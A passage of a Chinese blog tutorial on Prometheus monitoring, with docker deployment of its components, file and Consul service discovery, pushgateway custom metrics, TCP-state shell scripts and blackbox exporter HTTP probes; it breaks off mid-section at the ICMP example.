id="21、基于docker部署Prometheus相关组件"><a href="#21、基于docker部署Prometheus相关组件" class="headerlink" title="21、基于docker部署Prometheus相关组件"></a>21、基于docker部署Prometheus相关组件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.部署Prometheus -server <br>[root@jenkins211 ~]# docker run -d --network host --name prometheus-server prom/prometheus:v2.53.2 <br><br>2.部署node-exporter<br>[root@jenkins211 ~]# docker run  -d --name node-exporter --network host  prom/node-exporter:v1.8.2 <br><br>3.配置Prometheus server监控node-exporter<br>修改配置文件<br>[root@jenkins211 ~]# docker <span class="hljs-built_in">exec</span> -it prometheus-server sh<br>/prometheus $ <br>/prometheus $ vi /etc/prometheus/prometheus.yml <br>...<br>                                         <br>  - job_name: <span class="hljs-string">&quot;prometheus-node-exporter&quot;</span> <br>    static_configs:                     <br>    - targets:                          <br>      - 10.0.0.211:9100<br>      <br>重新加载配置<br>[root@jenkins211 ~]# docker restart prometheus-server <br>验证是否加载成功<br>http://10.0.0.211:9090/targets<br><br>4.部署grafana组件<br>部署 <br>[root@jenkins211 ~]# docker run -d --name grafana --network host grafana/grafana:9.5.21 <br>访问测试 <br>http://10.0.0.211:3000<br><br><br>5.部署pushgateway组件<br>部署 <br>[root@jenkins211 ~]# docker run -d --name pushgateway --network host prom/pushgateway:v1.9.0 <br>访问测试 <br>http://10.0.0.211:9091/<br><br>6.部署alertmanager组件<br>部署<br>[root@jenkins211 ~]# docker run -d --name alertmanager --network host prom/alertmanager:v0.27.0 <br>访问测试 <br>http://10.0.0.211:9093/#/alerts<br></code></pre></td></tr></table></figure><h2 id="22、文件发现服务"><a href="#22、文件发现服务" class="headerlink" title="22、文件发现服务"></a>22、文件发现服务</h2><p>静态配置：之前使用的都是静态分析，每次都要重启服务或者热加载文件</p><p>动态配置：可以动态发现服务，无需热加载文件</p><p>动态配置可分为json文件和yaml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.修改prometheus的配置文件 <br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br><br>...<br>  - job_name: <span class="hljs-string">&#x27;file-service-discovery-json&#x27;</span><br>    <span class="hljs-comment"># 基于文件的服务发现为动态发现</span><br>    file_sd_configs:<br>        <span class="hljs-comment"># 指定文件路径</span><br>      - files:<br>          - /softwares/prometheus-2.53.2.linux-amd64/config/*.json<br><br>  - job_name: <span class="hljs-string">&#x27;file-service-discovery-yaml&#x27;</span><br>    file_sd_configs:<br>      - files:<br>          - /softwares/prometheus-2.53.2.linux-amd64/config/*.yaml<br>          <br>          <br>2.重新加载配置 <br>[root@prometheus-server31 ~]# rr<br><br>3.访问WebUI验证配置是否生效<br>http://10.0.0.31:9090/config<br><br>4.创建配置文件模拟基于动态的监控<br>创建目录 <br>[root@prometheus-server31 ~]# <span class="hljs-built_in">mkdir</span> -pv /softwares/prometheus-2.53.2.linux-amd64/config<br>创建json文件监控41节点<br>[root@prometheus-server31 ~]# <span class="hljs-built_in">cat</span> /softwares/prometheus-2.53.2.linux-amd64/config/linux.json<br>[<br>  &#123;<br>    <span class="hljs-string">&quot;targets&quot;</span>: [ <span class="hljs-string">&quot;10.0.0.41:9100&quot;</span> ],<br>    <span class="hljs-string">&quot;labels&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;school&quot;</span>: <span class="hljs-string">&quot;cherry&quot;</span>,<br>      <span class="hljs-string">&quot;class&quot;</span>: <span class="hljs-string">&quot;123456&quot;</span><br>    &#125;<br>  &#125;<br>]<br>创建yaml文件监控42和43节点<br>[root@prometheus-server31 ~]# <span class="hljs-built_in">cat</span> /softwares/prometheus-2.53.2.linux-amd64/config/haha.yaml <br>- targets:<br>    - <span class="hljs-string">&#x27;10.0.0.42:9100&#x27;</span><br>    - <span class="hljs-string">&#x27;10.0.0.43:9100&#x27;</span><br>  labels:<br>    apps: yaml<br>    address: shahe<br>    <br>再次查看Prometheus的WebUI<br>http://10.0.0.31:9090/targets<br><br>参考链接:https://prometheus.io/docs/prometheus/2.53/configuration/configuration/#file_sd_config<br></code></pre></td></tr></table></figure><h2 id="23、consul服务发现"><a href="#23、consul服务发现" class="headerlink" title="23、consul服务发现"></a><strong>23、consul服务发现</strong></h2><p>普罗米修斯服务端不能直接发现node节点，由consul服务端将node节点告诉过普罗米修斯服务端，consul也属于动态发现服务</p><p><strong>node节点部署consul集群</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 下载consul<br>wget https://releases.hashicorp.com/consul/1.19.1/consul_1.19.1_freebsd_amd64.zip<br><br>2 快速部署consul集群<br>下载consul<br>wget https://releases.hashicorp.com/consul/1.19.1/consul_1.19.1_freebsd_amd64.zip<br><br>解压consul<br>unzip consul_1.19.1_linux_amd64.zip  -d /usr/local/bin/<br><br>运行consul 集群<br>leader43:<br>consul agent -server -bootstrap -<span class="hljs-built_in">bind</span>=10.0.0.43 -data-dir=/softwares/consul -client=10.0.0.43 -ui<br><br><br>follower42:<br>consul agent  -<span class="hljs-built_in">bind</span>=10.0.0.42 -data-dir=/softwares/consul -client=10.0.0.42 -ui -retry-join=10.0.0.43<br><br><br>follower41:<br>consul agent -server -<span class="hljs-built_in">bind</span>=10.0.0.41 -data-dir=/softwares/consul -client=10.0.0.41 -ui -retry-join=10.0.0.43<br><br>访问console服务的WebUI，查看node节点<br>http://10.0.0.43:8500/ui/dc1/nodes<br></code></pre></td></tr></table></figure><p><strong>配置自动发现</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 修改prometheus的配置文件<br>vim /softwares/prometheus/prometheus.yml<br>...<br>scrape_configs:<br>  ...<br>  - job_name: <span class="hljs-string">&quot;consul-seriver-discovery&quot;</span><br>    <span class="hljs-comment"># 配置基于consul的服务发现</span><br>    consul_sd_configs:<br>        <span class="hljs-comment"># 指定consul的服务器地址，若不指定，则默认值为&quot;localhost:8500&quot;.</span><br>      - server: 10.0.0.43:8500<br>      - server: 10.0.0.42:8500<br>      - server: 10.0.0.41:8500<br>    relabel_configs:<br>        <span class="hljs-comment"># 匹配consul的源标签字段，表示服务名称</span><br>      - source_labels: [__meta_consul_service]<br>        <span class="hljs-comment"># 指定源标签的正则表达式，若不定义，默认值为&quot;(.*)&quot;</span><br>        regex: consul<br>        <span class="hljs-comment"># 执行动作为删除，默认值为&quot;replace&quot;,有效值有多种</span><br>        <span class="hljs-comment">#   https://prometheus.io/docs/prometheus/latest/configuration/configuration/#relabel_action</span><br>        action: drop<br><br>2 检查配置文件是否正确并重新加载配置<br>[root@prometheus-server31 ~]# check <br>[root@prometheus-server31 ~]# rr<br><br>3.被监控节点注册到console集群<br>注册节点<br>[root@prometheus-server31 prometheus-2.53.2.linux-amd64]# curl -X PUT -d <span class="hljs-string">&#x27;&#123;&quot;id&quot;:&quot;prometheus-node42&quot;,&quot;name&quot;:&quot;prometheus-node42&quot;,&quot;address&quot;:&quot;10.0.0.42&quot;,&quot;port&quot;:9100,&quot;tags&quot;:[&quot;node-exporter&quot;],&quot;checks&quot;: [&#123;&quot;http&quot;:&quot;http://10.0.0.42:9100&quot;,&quot;interval&quot;:&quot;5m&quot;&#125;]&#125;&#x27;</span> http://10.0.0.42:8500/v1/agent/service/register<br><br>[root@prometheus-server31 prometheus-2.53.2.linux-amd64]# curl -X PUT -d <span class="hljs-string">&#x27;&#123;&quot;id&quot;:&quot;prometheus-node41&quot;,&quot;name&quot;:&quot;prometheus-node42&quot;,&quot;address&quot;:&quot;10.0.0.41&quot;,&quot;port&quot;:9100,&quot;tags&quot;:[&quot;node-exporter&quot;],&quot;checks&quot;: [&#123;&quot;http&quot;:&quot;http://10.0.0.41:9100&quot;,&quot;interval&quot;:&quot;5m&quot;&#125;]&#125;&#x27;</span> http://10.0.0.42:8500/v1/agent/service/register<br><br>[root@prometheus-server31 prometheus-2.53.2.linux-amd64]# curl -X PUT -d <span class="hljs-string">&#x27;&#123;&quot;id&quot;:&quot;prometheus-node43&quot;,&quot;name&quot;:&quot;prometheus-node42&quot;,&quot;address&quot;:&quot;10.0.0.43&quot;,&quot;port&quot;:9100,&quot;tags&quot;:[&quot;node-exporter&quot;],&quot;checks&quot;: [&#123;&quot;http&quot;:&quot;http://10.0.0.43:9100&quot;,&quot;interval&quot;:&quot;5m&quot;&#125;]&#125;&#x27;</span> http://10.0.0.42:8500/v1/agent/service/register<br><br>注销节点,在哪个节点注册就要在哪个节点注销<br>[root@prometheus-server31 prometheus-2.53.2.linux-amd64]# curl -X PUT http://10.0.0.42:8500/v1/agent/service/deregister/prometheus-node42<br><br>[root@prometheus-server31 prometheus-2.53.2.linux-amd64]# curl -X PUT http://10.0.0.42:8500/v1/agent/service/deregister/prometheus-node41<br><br>[root@prometheus-server31 prometheus-2.53.2.linux-amd64]# curl -X PUT http://10.0.0.42:8500/v1/agent/service/deregister/prometheus-node43<br><br><br></code></pre></td></tr></table></figure><h2 id="24、pushgateway自定义监控指标"><a href="#24、pushgateway自定义监控指标" class="headerlink" title="24、pushgateway自定义监控指标"></a>24、pushgateway自定义监控指标</h2><ul><li>Prometheus 采用 pull 模式，可能由于不在一个子网或者防火墙原因，导致 Prometheus 无法直接拉取各个 target 数据。</li><li>在监控业务数据的时候，需要将不同数据汇总, 由 Prometheus 统一收集。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.下载组件<br>wget https://github.com/prometheus/pushgateway/releases/download/v1.9.0/pushgateway-1.9.0.linux-amd64.tar.gz<br><br>2.解压软件包 <br>[root@prometheus-server32 ~]# tar xf pushgateway-1.9.0.linux-amd64.tar.gz  -C /softwares/<br><br>3.启动pushgateway组件 <br>[root@prometheus-server32 ~]# <span class="hljs-built_in">cd</span> /softwares/pushgateway-1.9.0.linux-amd64/<br>[root@prometheus-server32 pushgateway-1.9.0.linux-amd64]# ./pushgateway <br><br>4.访问pushgateway的WebUI<br>http://10.0.0.32:9091/#<br><br>5.Prometheus server监控pushgateway <br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>  - job_name: pushgateway<br>    <span class="hljs-comment"># 若不指定则默认值为false。</span><br>    <span class="hljs-comment"># 当设置为true时，若采集的指标包含中和内置的标签冲突时(比如job,instance)会覆盖。</span><br>    <span class="hljs-comment"># 当设置为false时，则不会覆盖，而是在标签前面加一个&quot;exported_*&quot;字段。</span><br>    honor_labels: <span class="hljs-literal">true</span><br>    static_configs:<br>    - targets:<br>      - 10.0.0.32:9091<br>      <br>[root@prometheus-server31 ~]# rr<br><br>7.推送数据到pushgateway组件<br>-------------------------<br>传递的数据是键值对，KEY一般是字符串类型，而value必须是一个数字类型。<br>[root@prometheus-server31 ~]# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;student_online 97&quot;</span> | curl --data-binary @-  http://10.0.0.32:9091/metrics/job/student/instance/10.0.0.31<br><br>8.在Prometheus的WebUI验证数据是否推送成功<br>在Prometheus的WebUI中搜索“student_online”<br></code></pre></td></tr></table></figure><h2 id="25、prometheus监控tcp的12种状态案例"><a href="#25、prometheus监控tcp的12种状态案例" class="headerlink" title="25、prometheus监控tcp的12种状态案例"></a>25、prometheus监控tcp的12种状态案例</h2><p><strong>查看单个状态脚本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@prometheus-server31 ~]# <span class="hljs-built_in">cat</span> /usr/local/bin/tcp_status.sh  <br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment"># auther: cherry</span><br><span class="hljs-comment"># school: 001</span><br><span class="hljs-comment"># class: 002</span><br><span class="hljs-comment"># office: www.cherry.com</span><br><br><br><span class="hljs-comment"># 定义TCP的12种状态</span><br>ESTABLISHED_COUNT=0<br>SYN_SENT_COUNT=0<br>SYN_RECV_COUNT=0<br>FIN_WAIT1_COUNT=0<br>FIN_WAIT2_COUNT=0<br>TIME_WAIT_COUNT=0<br>CLOSE_COUNT=0<br>CLOSE_WAIT_COUNT=0<br>LAST_ACK_COUNT=0<br>LISTEN_COUNT=0<br>CLOSING_COUNT=0<br>UNKNOWN_COUNT=0<br><br><span class="hljs-comment"># 定义任务名称</span><br>JOB_NAME=tcp_status<br><span class="hljs-comment"># 定义实例名称</span><br>INSTANCE_NAME=prometheus32<br><span class="hljs-comment"># 定义pushgateway主机</span><br>HOST=10.0.0.32<br><span class="hljs-comment"># 定义pushgateway端口</span><br>PORT=9091<br><br><span class="hljs-comment"># TCP的12种状态</span><br>ALL_STATUS=(ESTABLISHED SYN_SENT SYN_RECV FIN_WAIT1 FIN_WAIT2 TIME_WAIT CLOSE CLOSE_WAIT LAST_ACK LISTEN CLOSING UNKNOWN)<br><br><span class="hljs-comment"># 声明一个关联数组,类似于py的dict,go的map</span><br><span class="hljs-built_in">declare</span> -A tcp_status<br><br><span class="hljs-comment"># 统计TCP的12种状态</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;ALL_STATUS[@]&#125;</span><br><span class="hljs-keyword">do</span><br>  temp=`netstat -untalp | grep <span class="hljs-variable">$i</span>  | <span class="hljs-built_in">wc</span> -l`<br>  tcp_status[<span class="hljs-variable">$&#123;i&#125;</span>]=<span class="hljs-variable">$temp</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># 将统计后的结果发送到pushgateway</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;!tcp_status[@]&#125;</span><br><span class="hljs-keyword">do</span> <br>   data=<span class="hljs-string">&quot;<span class="hljs-variable">$i</span> <span class="hljs-variable">$&#123;tcp_status[$i]&#125;</span>&quot;</span><br>   <span class="hljs-comment"># TODO: shell如果想要设计成相同key不同标签的方式存在问题，只会有最后一种状态被发送</span><br>   <span class="hljs-comment"># 目前我怀疑是pushgateway组件不支持同一个metrics中key所对应的value不同的情况。</span><br>   <span class="hljs-comment">#data=&quot;tcp_all_status&#123;status=\&quot;$i\&quot;&#125; $&#123;tcp_status[$i]&#125;&quot;</span><br>   <span class="hljs-comment">#echo $data</span><br>   <span class="hljs-built_in">echo</span> <span class="hljs-variable">$data</span> | curl --data-binary @-  http://<span class="hljs-variable">$&#123;HOST&#125;</span>:<span class="hljs-variable">$&#123;PORT&#125;</span>/metrics/job/<span class="hljs-variable">$&#123;JOB_NAME&#125;</span>/instance/<span class="hljs-variable">$&#123;INSTANCE_NAME&#125;</span><br>   <span class="hljs-comment"># sleep 1</span><br><span class="hljs-keyword">done</span><br><br>查看pushgateway<br>http://10.0.0.32:9091/#<br><br>普罗米修斯查看是否监测<br>ESTABLISHED.........<br><br></code></pre></td></tr></table></figure><p><strong>查看多个状态值</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@prometheus-server31 ~]# <span class="hljs-built_in">cat</span> -A /usr/local/bin/tcp_status2.sh<br><span class="hljs-comment">#!/bin/bash$</span><br>$<br><span class="hljs-comment"># M-hM-.M-&gt;M-gM-=M-. Pushgateway M-gM-^ZM-^D URL$</span><br>pushgateway_url=<span class="hljs-string">&quot;http://10.0.0.42:9091/metrics/job/tcp_status&quot;</span>$<br><span class="hljs-keyword">time</span>=$(<span class="hljs-built_in">date</span> +%Y-%m-%d+%H:%M:%S)$<br>$<br>state=<span class="hljs-string">&quot;SYN-SENT SYN-RECV FIN-WAIT-1 FIN-WAIT-2 TIME-WAIT CLOSE CLOSE-WAIT LAST-ACK LISTEN CLOSING ESTAB&quot;</span>$<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  $state$<br> <span class="hljs-keyword">do</span>$<br> t=`ss -tan |grep <span class="hljs-variable">$i</span> |<span class="hljs-built_in">wc</span> -l`$<br> <span class="hljs-built_in">echo</span> tcp_connections&#123;state=\&quot;<span class="hljs-string">&quot;<span class="hljs-variable">$i</span>&quot;</span>\&quot;&#125; <span class="hljs-variable">$t</span> &gt;&gt;/tmp/tcp.txt$<br><span class="hljs-keyword">done</span>;$<br>$<br><span class="hljs-built_in">cat</span> /tmp/tcp.txt | curl --data-binary @- $pushgateway_url$<br><span class="hljs-built_in">rm</span> -rf  /tmp/tcp.txt$<br></code></pre></td></tr></table></figure><h2 id="26、黑盒监控服务"><a href="#26、黑盒监控服务" class="headerlink" title="26、黑盒监控服务"></a>26、黑盒监控服务</h2><p>黑盒监控服务也属于自定义的一种监控指标。</p><p>1.所谓的黑盒监控<br>黑盒监控指的是事故已经发生了，才监控到，表示的是从外部监控。举例例子: 网站挂了。</p><p>白盒监控指的是服务内部暴露出来的指标，可以更早的预判出问题可能发生的点。举例例子: 当前服务器的负载，队列等待处理的数量异常过高。</p><p>2.blackbox_exporter概述<br>blackbox exporter支持基于HTTP, HTTPS, DNS, TCP, ICMP, gRPC协议来对目标节点进行监控。</p><p>比如基于http协议我们可以探测一个网站的返回状态码为200判读服务是否正常。</p><p>比如基于TCP协议我们可以探测一个主机端口是否监听。</p><p>比如基于ICMP协议来ping一个主机的连通性。</p><p>比如基于gRPC协议来调用接口并验证服务是否正常工作。</p><p>比如基于DNS协议可以来检测域名解析。</p><p><strong>部署blackbox exporter</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">下载blackbox exporter<br>wget https://github.com/prometheus/blackbox_exporter/releases/download/v0.25.0/blackbox_exporter-0.25.0.linux-amd64.tar.gz<br><br>解压软件包<br>[root@prometheus-server32 ~]# tar xf blackbox_exporter-0.25.0.linux-amd64.tar.gz -C  /softwares/<br><br>启动服务<br>[root@prometheus-server32 ~]# <span class="hljs-built_in">cd</span> /softwares/blackbox_exporter-0.25.0.linux-amd64/<br>[root@prometheus-server32 blackbox_exporter-0.25.0.linux-amd64]# ./blackbox_exporter<br><br>访问blackbox的WebUI<br>http://10.0.0.32:9115/metrics<br></code></pre></td></tr></table></figure><h4 id="基于blackbox的http模块监控网站状态"><a href="#基于blackbox的http模块监控网站状态" class="headerlink" title="基于blackbox的http模块监控网站状态"></a>基于blackbox的http模块监控网站状态</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs bash">修改Prometheus配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br><br>...<br>scrape_configs:<br>  ...<br>    <span class="hljs-comment"># 指定作业的名称，生成环境中，通常是指一类业务的分组配置。</span><br>  - job_name: <span class="hljs-string">&#x27;blackbox-exporter-http&#x27;</span><br>    <span class="hljs-comment"># 修改访问路径，若不修改，默认值为&quot;/metrics&quot;</span><br>    metrics_path: /probe<br>    <span class="hljs-comment"># 配置URL的相关参数</span><br>    params:<br>      <span class="hljs-comment"># 此处表示使用的是blackbox的http模块，从而判断相应的返回状态码是否为200</span><br>      module: [http_2xx] <br>  <span class="hljs-comment"># 下面这两个标签是我自定义的，便于大家理解</span><br>      school: [001]<br>      class: [<span class="hljs-string">&quot;002&quot;</span>]<br>    <span class="hljs-comment"># 静态配置，需要手动指定监控目标</span><br>    static_configs:<br>        <span class="hljs-comment"># 需要监控的目标</span><br>      - targets:<br>          <span class="hljs-comment"># 支持https协议</span><br>        - https://www.cherry.com/<br>          <span class="hljs-comment"># 支持http协议</span><br>        - http://10.0.0.41<br>          <span class="hljs-comment"># 支持http协议和自定义端口</span><br>        - http://10.0.0.31:9090<br>    <span class="hljs-comment"># 对目标节点进行重新打标签配置</span><br>    relabel_configs:<br>        <span class="hljs-comment"># 指定源标签，此处的&quot;__address__&quot;表示内置的标签，存储的是被监控目标的IP地址</span><br>      - source_labels: [__address__]<br>        <span class="hljs-comment"># 指定目标标签，其实就是在&quot;Endpoint&quot;中加了一个target字段(用于指定监控目标)，</span><br>        target_label: __param_target<br>        <span class="hljs-comment"># 指定需要执行的动作，默认值为&quot;replace&quot;，常用的动作有: replace, keep, and drop。</span><br>        <span class="hljs-comment"># 但官方支持十几种动作： https://prometheus.io/docs/prometheus/2.53/configuration/configuration/#relabel_action</span><br>        <span class="hljs-comment"># 将&quot;__address__&quot;传递给target字段。</span><br>        action: replace<br>      - source_labels: [__param_target]<br>        target_label: instance<br>        <span class="hljs-comment">#target_label: instance2024</span><br>        <br>        <span class="hljs-comment"># 上面的2个配置段也可以改写成如下的配置哟~</span><br>     <span class="hljs-comment"># - source_labels: [__address__]</span><br>     <span class="hljs-comment">#   target_label: instance</span><br>     <span class="hljs-comment">#   action: replace</span><br>     <span class="hljs-comment"># - source_labels: [instance]</span><br>     <span class="hljs-comment">#   target_label: __param_target</span><br>     <span class="hljs-comment">#   action: replace</span><br>      - target_label: __address__<br>        <span class="hljs-comment"># 指定要替换的值,此处我指定为blackbox exporter的主机地址</span><br>        replacement: 10.0.0.32:9115<br><br>检查配置文件是否正确并重新加载配置文件<br>[root@prometheus-server31 ~]# check <br>[root@prometheus-server31 ~]# rr<br><br>访问prometheus的WebUI<br>http://10.0.0.31:9090/targets<br><br>访问blackbox exporter的WebUI<br>http://10.0.0.41:9115/<br><br>grafana展示数据<br>7587<br>13659<br></code></pre></td></tr></table></figure><h4 id="基于blackbox的ICMP监控目标主机是否存活"><a href="#基于blackbox的ICMP监控目标主机是否存活" class="headerlink" title="基于blackbox的ICMP监控目标主机是否存活"></a>基于blackbox的ICMP监控目标主机是否存活</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 